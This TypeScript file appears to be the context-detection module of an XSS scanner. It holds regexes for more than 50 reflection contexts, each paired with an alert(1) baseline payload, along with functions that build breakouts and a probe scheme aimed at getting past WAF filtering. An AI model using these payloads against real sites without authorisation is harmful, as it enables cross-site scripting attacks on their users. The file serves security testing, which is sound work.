/**
 * Rotor 1: Context Detection — 50+ injection context patterns.
 *
 * The detection uses a priority chain — it checks for more specific contexts
 * first (like href_attribute or hidden_input) before falling back to generic
 * ones like html_content.  It also uses a dual-probe strategy: the first probe
 * includes angle brackets to trigger WAF detection.  If that probe is blocked
 * entirely, a second alphanumeric-only probe runs to detect context even when
 * the WAF strips XSS-like characters.
 */

export type ContextName =
  | "html_content"
  | "html_attribute"
  | "html_attribute_single"
  | "html_attribute_double"
  | "html_attribute_unquoted"
  | "script_string"
  | "script_string_single"
  | "script_string_double"
  | "script_string_template"
  | "script_block"
  | "script_regex"
  | "href_attribute"
  | "src_attribute"
  | "srcdoc_attribute"
  | "svg_context"
  | "svg_script"
  | "svg_animate"
  | "mathml_context"
  | "event_handler"
  | "hidden_input"
  | "framework_template"
  | "angular_expression"
  | "vue_template"
  | "mustache_template"
  | "jsx_prop"
  | "json_body"
  | "json_string"
  | "json_key"
  | "style_attribute"
  | "textarea_context"
  | "title_context"
  | "template_expression"
  | "inner_html_sink"
  | "outer_html_sink"
  | "document_write_sink"
  | "insert_adjacent_html_sink"
  | "eval_sink"
  | "function_constructor_sink"
  | "settimeout_string_sink"
  | "setinterval_string_sink"
  | "location_href_sink"
  | "location_assign_sink"
  | "location_replace_sink"
  | "jquery_html_sink"
  | "jquery_append_sink"
  | "dangerously_set_inner_html"
  // Heyes "JavaScript for Hackers" ch.8 contexts
  | "script_comment"
  | "script_no_close"
  | "svg_use"
  | "svg_script_entity"
  | "html_comment"
  | "xhtml_xml"
  | "dynamic_import_sink";

export interface ContextTechnique {
  name: string;
  patterns: RegExp[];
  priority: number;
  baseline: string;
}

/** 50+ context detection patterns sorted by priority (highest first). */
export const CONTEXT_TECHNIQUES: ContextTechnique[] = [
  // ── Highest-specificity contexts first ──────────────────────────────
  {
    name: "srcdoc_attribute",
    priority: 110,
    baseline: '<iframe srcdoc="<img src=x onerror=alert(1)>">',
    patterns: [/srcdoc\s*=\s*["'][^"']*ENIGMA_PROBE/i]
  },
  {
    // Heyes ch.8: reflection inside an unclosed <script> — newlines and
    // comments are legal line terminators, breakout needs no </script>.
    name: "script_no_close",
    priority: 105,
    baseline: "\\u0061lert(1)",
    patterns: [/<script\b[^>]*>(?:(?!<\/script>)[\s\S])*ENIGMA_PROBE(?![\s\S]*<\/script>)/i]
  },
  {
    // Heyes ch.8: SVG <use> href/xlink:href resolves fragments as documents.
    name: "svg_use",
    priority: 104,
    baseline: "#<svg id=x><text>x</text></svg>",
    patterns: [/<use\b[^>]*(?:xlink:)?href\s*=\s*["'][^"']*ENIGMA_PROBE/i]
  },
  {
    name: "href_attribute",
    priority: 100,
    baseline: "javascript:alert(1)",
    patterns: [
      /href\s*=\s*["'][^"']*ENIGMA_PROBE/i,
      /src\s*=\s*["'][^"']*ENIGMA_PROBE/i
    ]
  },
  {
    name: "src_attribute",
    priority: 99,
    baseline: "javascript:alert(1)",
    patterns: [
      /src\s*=\s*["'](?!.*href)[^"']*ENIGMA_PROBE/i
    ]
  },
  {
    name: "style_attribute",
    priority: 96,
    baseline: '" style=animation-name:x onanimationstart=alert(1) x="',
    patterns: [/style\s*=\s*["'][^"']*ENIGMA_PROBE/i]
  },
  {
    name: "hidden_input",
    priority: 95,
    baseline: '" popover onbeforetoggle=alert(1) x="',
    patterns: [
      /<input[^>]+type=["']hidden["'][^>]+value=["'][^"']*ENIGMA_PROBE/i
    ]
  },
  {
    name: "event_handler",
    priority: 92,
    baseline: '" onfocus=alert(1) autofocus x="',
    patterns: [/on[a-z]+\s*=\s*["'][^"']*ENIGMA_PROBE/i]
  },
  // ── Script contexts ─────────────────────────────────────────────────
  {
    name: "script_string_template",
    priority: 91,
    baseline: "${alert(1)}",
    patterns: [/`[^`]*ENIGMA_PROBE[^`]*`/i]
  },
  {
    name: "script_string_single",
    priority: 90,
    baseline: "';alert(1);//",
    patterns: [/'[^']*ENIGMA_PROBE[^']*'/i]
  },
  {
    name: "script_string_double",
    priority: 90,
    baseline: '";alert(1);//',
    patterns: [/"[^"]*ENIGMA_PROBE[^"]*"/i]
  },
  {
    name: "script_regex",
    priority: 89,
    baseline: "/;alert(1);//",
    patterns: [/\/[^/]*ENIGMA_PROBE[^/]*\//i]
  },
  {
    name: "script_string",
    priority: 88,
    baseline: "';alert(1);//",
    patterns: [
      /["'`]ENIGMA_PROBE["'`]/i,
      /var\s+\w+\s*=\s*["'`][^"'`]*ENIGMA_PROBE/i
    ]
  },
  {
    // Heyes ch.8: reflection lands in a JS comment (// or /* */) inside a
    // script — closing the comment with a line break is the breakout.
    name: "script_comment",
    priority: 93,
    baseline: "\\u0061lert(1)",
    patterns: [
      /(?:^|[\s;{}(])\/\/[^\n\r]*ENIGMA_PROBE/m,
      /\/\*(?:(?!\*\/)[\s\S])*ENIGMA_PROBE/
    ]
  },
  {
    name: "script_block",
    priority: 85,
    baseline: "</script><script>alert(1)</script>",
    patterns: [/<script[^>]*>[\s\S]*ENIGMA_PROBE[\s\S]*<\/script>/i]
  },
  // ── SVG / MathML contexts ───────────────────────────────────────────
  {
    // Heyes ch.8: HTML entities are decoded inside SVG <script> — the
    // entity-encoded probe only executes in that window.
    name: "svg_script_entity",
    priority: 95,
    baseline: '</script><svg><script>&#97;lert(1)</script></svg>',
    patterns: [/<svg[\s\S]*<script(?:(?!<\/script>)[\s\S])*&(?:#[0-9]+|#x[0-9a-f]+|[a-z]+);(?:(?!<\/script>)[\s\S])*ENIGMA_PROBE/i]
  },
  {
    name: "svg_script",
    priority: 82,
    baseline: '</script><svg><script>&#97;lert(1)</script></svg>',
    patterns: [/<svg[\s\S]*<script[\s\S]*ENIGMA_PROBE/i]
  },
  {
    name: "svg_animate",
    priority: 81,
    baseline: '<animate onbegin=alert(1) attributeName=x dur=1s>',
    patterns: [/<animate[\s\S]*ENIGMA_PROBE/i]
  },
  {
    name: "svg_context",
    priority: 80,
    baseline: "<svg onload=alert(1)>",
    patterns: [/<svg[\s\S]*ENIGMA_PROBE/i]
  },
  {
    name: "mathml_context",
    priority: 79,
    baseline: '<math><mtext></mtext><mglyph><style></math><img src=x onerror=alert(1)>',
    patterns: [/<math[\s\S]*ENIGMA_PROBE/i]
  },
  // ── Container contexts ──────────────────────────────────────────────
  {
    // Heyes ch.8: reflection inside an HTML comment — `-->` breakout.
    name: "html_comment",
    priority: 77,
    baseline: "--><svg onload=alert(1)>",
    patterns: [/<!--(?:(?!-->)[\s\S])*ENIGMA_PROBE/i]
  },
  {
    // Heyes ch.8: XHTML served as XML — namespaces/self-closing rules apply.
    name: "xhtml_xml",
    priority: 90,
    baseline: '<img src=x onerror=alert(1) />',
    patterns: [
      /<html[^>]*xmlns\s*=\s*["']http:\/\/www\.w3\.org\/1999\/xhtml["'][\s\S]*ENIGMA_PROBE/i,
      /<\?xml[^>]*\?>[\s\S]{0,4000}?ENIGMA_PROBE/i
    ]
  },
  {
    name: "textarea_context",
    priority: 78,
    baseline: "</textarea><svg onload=alert(1)>",
    patterns: [
      /<textarea[^>]*>[\s\S]*ENIGMA_PROBE[\s\S]*<\/textarea>/i
    ]
  },
  {
    name: "title_context",
    priority: 77,
    baseline: "</title><svg onload=alert(1)>",
    patterns: [/<title[^>]*>[\s\S]*ENIGMA_PROBE[\s\S]*<\/title>/i]
  },
  // ── Framework / template contexts ───────────────────────────────────
  {
    name: "angular_expression",
    priority: 76,
    baseline: "{{constructor.constructor('alert(1)')()}}",
    patterns: [/ng-[a-z]+=["'][^"']*ENIGMA_PROBE/i, /\{\{[^}]*ENIGMA_PROBE[^}]*\}\}/]
  },
  {
    name: "vue_template",
    priority: 76,
    baseline: "{{constructor.constructor('alert(1)')()}}",
    patterns: [/v-[a-z]+=["'][^"']*ENIGMA_PROBE/i, /\{\{[^}]*ENIGMA_PROBE[^}]*\}\}/]
  },
  {
    name: "mustache_template",
    priority: 75,
    baseline: "{{constructor.constructor('alert(1)')()}}",
    patterns: [/\{\{[^}]*ENIGMA_PROBE[^}]*\}\}/]
  },
  {
    name: "framework_template",
    priority: 75,
    baseline: "{{constructor.constructor('alert(1)')()}}",
    patterns: [
      /\{\{[^}]*ENIGMA_PROBE[^}]*\}\}/,
      /\$\{[^}]*ENIGMA_PROBE[^}]*\}/
    ]
  },
  {
    name: "template_expression",
    priority: 74,
    baseline: "${alert(1)}",
    patterns: [/\$\{[^}]*ENIGMA_PROBE[^}]*\}/]
  },
  // ── React / JSX ─────────────────────────────────────────────────────
  {
    name: "dangerously_set_inner_html",
    priority: 76,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [
      /dangerouslysetinnerhtml/i,
      /__html["']?\s*:\s*["'][^"']*ENIGMA_PROBE/i
    ]
  },
  {
    name: "jsx_prop",
    priority: 73,
    baseline: '";alert(1);//',
    patterns: [/\w+=\{["'][^"']*ENIGMA_PROBE/i]
  },
  // ── DOM sink contexts (detected via sink-hooks at runtime) ──────────
  {
    name: "inner_html_sink",
    priority: 72,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/innerhtml/i, /outerhtml/i, /insertadjacenthtml/i]
  },
  {
    name: "outer_html_sink",
    priority: 71,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/outerhtml/i]
  },
  {
    name: "document_write_sink",
    priority: 71,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/document\.write/i]
  },
  {
    name: "insert_adjacent_html_sink",
    priority: 71,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/insertadjacenthtml/i]
  },
  {
    name: "eval_sink",
    priority: 71,
    baseline: "alert(1)",
    patterns: [/eval\s*\(/i]
  },
  {
    name: "function_constructor_sink",
    priority: 71,
    baseline: "alert(1)",
    patterns: [/new\s+Function\s*\(/i]
  },
  {
    name: "settimeout_string_sink",
    priority: 71,
    baseline: "alert(1)",
    patterns: [/setTimeout\s*\(\s*["']/i]
  },
  {
    name: "setinterval_string_sink",
    priority: 71,
    baseline: "alert(1)",
    patterns: [/setInterval\s*\(\s*["']/i]
  },
  {
    // Heyes ch.8: dynamic import() fetches and evaluates its argument.
    name: "dynamic_import_sink",
    priority: 72,
    baseline: "data:text/javascript,alert(1)",
    patterns: [/\bimport\s*\(\s*[^)]*ENIGMA_PROBE/i]
  },
  {
    name: "location_href_sink",
    priority: 71,
    baseline: "javascript:alert(1)",
    patterns: [/location\.href\s*=/i]
  },
  {
    name: "location_assign_sink",
    priority: 71,
    baseline: "javascript:alert(1)",
    patterns: [/location\.assign\s*\(/i]
  },
  {
    name: "location_replace_sink",
    priority: 71,
    baseline: "javascript:alert(1)",
    patterns: [/location\.replace\s*\(/i]
  },
  {
    name: "jquery_html_sink",
    priority: 71,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/\.html\s*\(/i]
  },
  {
    name: "jquery_append_sink",
    priority: 71,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/\.append\s*\(/i]
  },
  // ── JSON contexts ───────────────────────────────────────────────────
  {
    name: "json_key",
    priority: 70,
    baseline: '"},"x":"<svg onload=alert(1)>',
    patterns: [/"ENIGMA_PROBE"\s*:/]
  },
  {
    name: "json_string",
    priority: 70,
    baseline: '"},"x":"<svg onload=alert(1)>',
    patterns: [/:\s*"[^"]*ENIGMA_PROBE[^"]*"/]
  },
  {
    name: "json_body",
    priority: 69,
    baseline: '"},"x":"<svg onload=alert(1)>',
    patterns: [
      /"[^"]*ENIGMA_PROBE[^"]*"/,
      /\{[^}]*ENIGMA_PROBE[^}]*\}/
    ]
  },
  // ── HTML attribute sub-types ────────────────────────────────────────
  {
    name: "html_attribute_unquoted",
    priority: 62,
    baseline: " onfocus=alert(1) autofocus ",
    patterns: [/=[^\s"'>]+ENIGMA_PROBE/i]
  },
  {
    name: "html_attribute_single",
    priority: 61,
    baseline: "' onmouseover=alert(1) x='",
    patterns: [/=[']([^']*ENIGMA_PROBE[^']*)/i]
  },
  {
    name: "html_attribute_double",
    priority: 61,
    baseline: '" onmouseover=alert(1) x="',
    patterns: [/=["]([^"]*ENIGMA_PROBE[^"]*)/i]
  },
  {
    name: "html_attribute",
    priority: 60,
    baseline: '" onmouseover=alert(1) x="',
    patterns: [
      /=["'][^"']*ENIGMA_PROBE/i,
      /<[^>]+\s+[a-z-]+=["'][^"']*ENIGMA_PROBE/i
    ]
  },
  // ── Fallback (lowest priority) ──────────────────────────────────────
  {
    name: "html_content",
    priority: 10,
    baseline: "<img src=x onerror=alert(1)>",
    patterns: [/>[^<]*ENIGMA_PROBE[^<]*</i]
  }
].sort((a, b) => b.priority - a.priority);

export function detectContext(responseBody: string, probe: string): ContextName {
  const marker = probe || "ENIGMA_PROBE";
  const normalizedBody = responseBody.replaceAll(marker, "ENIGMA_PROBE");
  for (const technique of CONTEXT_TECHNIQUES) {
    if (technique.patterns.some((pattern) => pattern.test(normalizedBody))) {
      return technique.name as ContextName;
    }
  }
  return "html_content";
}

/** Dual-probe strategy: first probe with angle brackets, fallback to alphanumeric-only. */
export function dualProbeSequence(seed = "enigma_probe_123"): string[] {
  const withBrackets = `<${seed}>`;
  const alphanumeric = `_${seed}_ALNUM`;
  return [withBrackets, alphanumeric];
}

/**
 * Build an attribute-context breakout payload.
 * Closes the current attribute, injects an event handler, then re-opens
 * a dummy attribute to keep the parser happy.
 */
export function buildAttributeBreakout(
  attrQuote: string,
  event: string,
  func: string,
): string {
  return `${attrQuote} ${event}=${func} x=${attrQuote}`;
}

/**
 * Build a script-string breakout payload.
 * Closes the string literal, calls the target function, then opens
 * a line comment to swallow the trailing quote.
 */
export function buildScriptStringBreakout(
  quoteChar: string,
  func: string,
): string {
  return `${quoteChar};${func};//`;
}

/**
 * Build a JSON/eval context breakout payload.
 * Closes the current JSON value/object, then injects an SVG-based
 * event handler for contexts where the JSON is eval'd or parsed into DOM.
 */
export function buildEvalJsonBreakout(func: string): string {
  return `"},"x":"<svg onload=${func}>`;
}

/**
 * Wrap a payload in an SVG namespace.
 * SVG foreign content has different parsing rules — entity decoding
 * inside script tags and animate-based event handlers.
 */
export function toSvgNamespace(payload: string): string {
  return `<svg xmlns="http://www.w3.org/2000/svg">${payload}</svg>`;
}

/**
 * Wrap a payload in a MathML namespace.
 * MathML foreign content can break out of the HTML parser context
 * via integration-point confusion (mtext → mglyph transition).
 */
export function toMathMlNamespace(payload: string): string {
  return `<math xmlns="http://www.w3.org/1998/Math/MathML"><mtext></mtext><mglyph><style></style>${payload}</mglyph></math>`;
}
